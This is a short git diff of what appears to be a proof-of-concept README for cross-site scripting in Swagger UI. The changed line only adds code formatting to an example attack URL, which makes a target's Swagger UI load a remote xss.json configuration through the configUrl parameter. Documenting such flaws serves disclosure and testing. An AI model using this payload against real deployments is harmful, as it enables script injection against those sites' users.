@@ -14,7 +14,7 @@ Use the following query strings with a vulnerable Swagger UI path, such as:
 
 `https://target-swagger.com/swagger/index.html?<QUERY>`
 
-Example: https://target-swagger.com/swagger/index.html?configUrl=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.json
+Example: `https://target-swagger.com/swagger/index.html?configUrl=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.json`
 
 #### JSON-based PoC
 
